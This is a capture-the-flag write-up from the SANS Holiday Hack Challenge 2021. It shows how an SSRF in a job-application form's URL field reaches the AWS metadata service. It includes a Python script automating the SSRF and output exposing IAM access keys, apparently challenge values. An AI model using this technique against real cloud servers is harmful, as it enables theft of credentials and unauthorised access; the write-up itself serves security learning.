
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Joe Ammond (pugpug)">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
    
    
      
        <title>Solution - SANS HHC 2021 writeup, Objective 10 (Now Hiring!)</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.bb3983ee.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.e6a45f82.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../css/print.css">
    
    <script>__md_scope=new URL("..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#solution" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" class="md-header__button md-logo" aria-label="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS HHC 2021 writeup, Objective 10 (Now Hiring!)
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Solution
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" class="md-nav__button md-logo" aria-label="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    SANS HHC 2021 writeup, Objective 10 (Now Hiring!)
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="https://ammond.org" class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        Introduction
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Solution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Solution
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#initial-recon" class="md-nav__link">
    Initial Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploiting-the-ssrf-vulnerability" class="md-nav__link">
    Exploiting the SSRF Vulnerability
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#automating-the-ssrf" class="md-nav__link">
    Automating the SSRF
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#retrieving-the-objective-data" class="md-nav__link">
    Retrieving the Objective Data
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../reversing/" class="md-nav__link">
        Reverse Engineering the Application Environment
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../rce/" class="md-nav__link">
        LFI to RCE... maybe?
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../conclusion/" class="md-nav__link">
        Conclustion
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#initial-recon" class="md-nav__link">
    Initial Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploiting-the-ssrf-vulnerability" class="md-nav__link">
    Exploiting the SSRF Vulnerability
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#automating-the-ssrf" class="md-nav__link">
    Automating the SSRF
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#retrieving-the-objective-data" class="md-nav__link">
    Retrieving the Objective Data
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

<h1 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">#</a></h1>
<p><img alt="Objective 10 description" src="../img/hhc-2021-01.png" /></p>
<p>Objective 10 asks us to retrieve the secret access key from the <a href="https://apply.jackfrosttower.com/">Jack Frost Tower
job application server</a>. Completing the IMDS
terminal gives us a hint to solving the objective: we need to access an <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">internal Amazon AWS
service</a>
to obtain EC2 metadata. As we don't have direct access to the EC2 instance the job
application server is running on, there is likely an SSRF vulnerability on the website,
where the web server will perform the request for us and return the data received.</p>
<h2 id="initial-recon">Initial Recon<a class="headerlink" href="#initial-recon" title="Permanent link">#</a></h2>
<p>Visiting the <a href="https://apply.jackfrosttower.com/">job application page</a> gives us a simple
job application site:</p>
<p><img alt="Jack Frost Tower Jobs" src="../img/hhc-2021-02.png" /></p>
<p>with a simple web form for submitting a job applicaton:</p>
<p><img alt="Job Application web form" src="../img/hhc-2021-03.png" /></p>
<p>One thing stands out: there is a field in the form for a URL to a <strong>Naughty List
Background Investigation (NLBI)</strong> report. </p>
<p><img alt="NLBI field" src="../img/hhc-2021-04.png" /></p>
<p>If the web server uses the URL in the web form to request data, it may be possible
to abuse this field to request data that normally isn't available. </p>
<h2 id="exploiting-the-ssrf-vulnerability">Exploiting the SSRF Vulnerability<a class="headerlink" href="#exploiting-the-ssrf-vulnerability" title="Permanent link">#</a></h2>
<p>By using the 
techniques from the IMDS terminal and the data from the page referenced in the hint,
we can submit a request to the web server and see if it retrieves data from the internal
address of <code>http://169.254.169.254/latest/meta-data</code>:</p>
<p><img alt="Fake submission" src="../img/hhc-2021-05.png" /></p>
<p>After submitting this, we get back a page with what appears to be a broken image:</p>
<p><img alt="Successful submission" src="../img/hhc-2021-06.png" /></p>
<p>Viewing the source of the web page shows a link to <code>images/{name}.png</code>, with the
name we submitted in the form:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;col-sm-4&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;card text-white bg-secondary mb-3&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;max-width: 20rem;&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;card-body&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">img</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;rounded mx-auto d-block&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pugpug.jpg&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;200px&quot;</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></div>
<p>If we open a terminal and visit that URL with curl or wget, we see that the
file actually contains the data we requested from the internal AWS metadata service:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>curl https://apply.jackfrosttower.com/images/pugpug.jpg
<span class="go">ami-id</span>
<span class="go">ami-launch-index</span>
<span class="go">ami-manifest-path</span>
<span class="go">block-device-mapping/ami</span>
<span class="go">block-device-mapping/ebs0</span>
<span class="go">block-device-mapping/ephemeral0</span>
<span class="go">block-device-mapping/root</span>
<span class="go">block-device-mapping/swap</span>
<span class="go">elastic-inference/associations</span>
<span class="go">elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1</span>
<span class="go">events/maintenance/scheduled</span>
<span class="go">events/recommendations/rebalance</span>
<span class="go">hostname</span>
<span class="go">iam/info</span>
<span class="go">iam/security-credentials</span>
<span class="go">...</span>
</code></pre></div>
<h2 id="automating-the-ssrf">Automating the SSRF<a class="headerlink" href="#automating-the-ssrf" title="Permanent link">#</a></h2>
<p>The objective can be easily completed with just a browser and curl, but as I'm 
diving deeper into the application than just the objective, I wrote a quick Python
script to provide a CLI for requesting URLs from the service. It's based on a
template I developed after reading <a href="https://twitter.com/0xdf_">0xdf</a>'s
<a href="https://0xdf.gitlab.io/">blog</a>, specifically his use of Python's <code>Cmd</code> module
to generate an easy to use CLI.</p>
<p>(seriously, go follow <code>0xdf_</code> on twitter and read his blog, it's awesome)</p>
<p>We start with Python boilerplate, defining the payload necessary to fill the web
form to trigger the SSRF:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># Generate a random name to avoid conflicts with others</span>
<span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;pugpug</span><span class="si">{:03d}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">999</span><span class="p">))</span>

<span class="c1"># The payload, copied from ZAProxy</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;inputName&#39;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
    <span class="s1">&#39;inputEmail&#39;</span><span class="p">:</span> <span class="s1">&#39;pug@pug.pug&#39;</span><span class="p">,</span>
    <span class="s1">&#39;inputPhone&#39;</span><span class="p">:</span> <span class="s1">&#39;313-555-1212&#39;</span><span class="p">,</span>
    <span class="s1">&#39;inputField&#39;</span><span class="p">:</span> <span class="s1">&#39;Aggravated pulling of hair&#39;</span><span class="p">,</span>
    <span class="s1">&#39;resumeFile&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;additionalInformation&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;submit&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
<span class="p">}</span>
</code></pre></div>
<p>The <code>fetch()</code> function submits the data to the web form, sending the passed
argument as the <code>inputWorkSample</code> field. It then requests the image file 
containing the data from the triggered SSRF, returning the request data.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Send two requests to the web server: the application submission, then</span>
<span class="c1"># request the &#39;image&#39;, returning whatever we pull back.</span>
<span class="c1">#</span>
<span class="c1"># parser.url is the URL of the website, from argparse</span>
<span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="c1"># Set the URL field to whatever is passed in the argument</span>
    <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;inputWorkSample&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">parser</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">parser</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;images/</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">.jpg&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
</code></pre></div>
<p>The heart of the program uses the <a href="https://docs.python.org/3/library/cmd.html"><code>Cmd</code></a>
module to generate a command-line interface. After some boilerplate code to set up
the class, the <code>default</code> function calls <code>fetch()</code> with what was entered on the 
command line, printing the result to the screen.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># The CLI module</span>
<span class="k">class</span> <span class="nc">Term</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
    <span class="c1"># Boilerplate to make the CLI more friendly.</span>
    <span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;ssrf&gt; &#39;</span>
    <span class="k">def</span> <span class="nf">emptyline</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">pass</span>
    <span class="k">def</span> <span class="nf">postloop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">()</span>
    <span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">True</span>
    <span class="k">def</span> <span class="nf">do_EOF</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="c1"># Main cmd loop: fetch whatever is entered at the prompt via the SSRF on</span>
    <span class="c1"># the web server, and print the result.</span>
    <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">fetch</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
</code></pre></div>
<p>The main program accepts two optional arguments: <code>--url</code> allows one to specify
a different URL to interact with, while <code>--file</code> specifies a single URL to request,
without running the CLI. This is useful for saving larger requested URLs without
copy/pasting.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Main program. The code accepts two arguments:</span>
<span class="c1">#</span>
<span class="c1"># --file: retrieve a single URL/file and print it. Useful for one-shot</span>
<span class="c1">#         file retrieval and storage </span>
<span class="c1">#         (e.g. ssrf.py --file https://google.com &gt; google)</span>
<span class="c1">#</span>
<span class="c1"># --url: the top-leve URL to send requests to. Will come in handy if we&#39;re</span>
<span class="c1">#        able to duplicate the website functionality locally</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--file&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> 
            <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Filename to fetch&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--url&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> 
            <span class="n">default</span><span class="o">=</span><span class="s1">&#39;https://apply.jackfrosttower.com/&#39;</span><span class="p">,</span>
            <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Top-level URL&#39;</span><span class="p">)</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">parser</span><span class="o">.</span><span class="n">filename</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">fetch</span><span class="p">(</span><span class="n">parser</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">term</span> <span class="o">=</span> <span class="n">Term</span><span class="p">()</span>
        <span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
</code></pre></div>
<h2 id="retrieving-the-objective-data">Retrieving the Objective Data<a class="headerlink" href="#retrieving-the-objective-data" title="Permanent link">#</a></h2>
<p>With this script, we can easily request the current role associated with the instance
by querying 
<code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code>, then use the
<code>role</code> returned to fetch the access keys:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py
<span class="go">ssrf&gt; http://169.254.169.254/latest/meta-data/iam/info</span>
<span class="go">{</span>
<span class="go">        &quot;Code&quot;: &quot;Success&quot;,</span>
<span class="go">        &quot;LastUpdated&quot;: &quot;2021-05-02T18:50:40Z&quot;,</span>
<span class="go">        &quot;InstanceProfileArn&quot;: &quot;arn:aws:iam::896453262835:instance-profile/jf-deploy-role&quot;,</span>
<span class="go">        &quot;InstanceProfileId&quot;: &quot;AIPA5BOGHHXZELSK34VU4&quot;</span>
<span class="go">}</span>
<span class="go">ssrf&gt; http://169.254.169.254/latest/meta-data/iam/security-credentials</span>
<span class="go">jf-deploy-role</span>
<span class="go">ssrf&gt; http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role</span>
<span class="go">{</span>
<span class="go">        &quot;Code&quot;: &quot;Success&quot;,</span>
<span class="go">        &quot;LastUpdated&quot;: &quot;2021-05-02T18:50:40Z&quot;,</span>
<span class="go">        &quot;Type&quot;: &quot;AWS-HMAC&quot;,</span>
<span class="go">        &quot;AccessKeyId&quot;: &quot;AKIA5HMBSK1SYXYTOXX6&quot;,</span>
<span class="go">        &quot;SecretAccessKey&quot;: &quot;CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX&quot;,</span>
<span class="go">        &quot;Token&quot;: &quot;NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==&quot;,</span>
<span class="go">        &quot;Expiration&quot;: &quot;2026-05-02T18:50:40Z&quot;</span>
<span class="go">}</span>
</code></pre></div>
<p>The SecretAccessKey is <strong>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</strong></p>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href=".." class="md-footer__link md-footer__link--prev" aria-label="Previous: Introduction" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Introduction
            </div>
          </div>
        </a>
      
      
        
        <a href="../reversing/" class="md-footer__link md-footer__link--next" aria-label="Next: Reverse Engineering the Application Environment" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Reverse Engineering the Application Environment
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Joe Ammond - <a href="https://twitter.com/joeammond">@joeammond</a>
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://github.com/joeammond" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
